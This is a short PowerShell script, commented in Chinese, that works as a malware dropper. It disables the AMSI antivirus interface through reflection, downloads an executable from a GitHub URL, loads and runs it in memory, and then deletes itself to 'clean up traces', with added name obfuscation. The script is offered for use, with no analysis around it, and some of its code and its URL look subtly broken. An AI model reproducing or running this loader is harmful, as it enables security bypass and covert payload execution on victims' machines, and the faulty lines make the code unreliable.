[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$ghRawUrl = "https://github.com/zhangsipng/payload.git/main/loader.exe"

# 使用分块编码和随机变量名混淆
$var1 = "New-Object"
$var2 = "Net.WebClient"
$var3 = "DownloadData"
$wc = [System.Activator]::CreateInstance([Type]::GetType("$var1 $var2"))

$bytes = $wc.$var3($ghRawUrl)


$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @(,[string[]] @()))

#  清理痕迹
Start-Sleep -Seconds 5
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue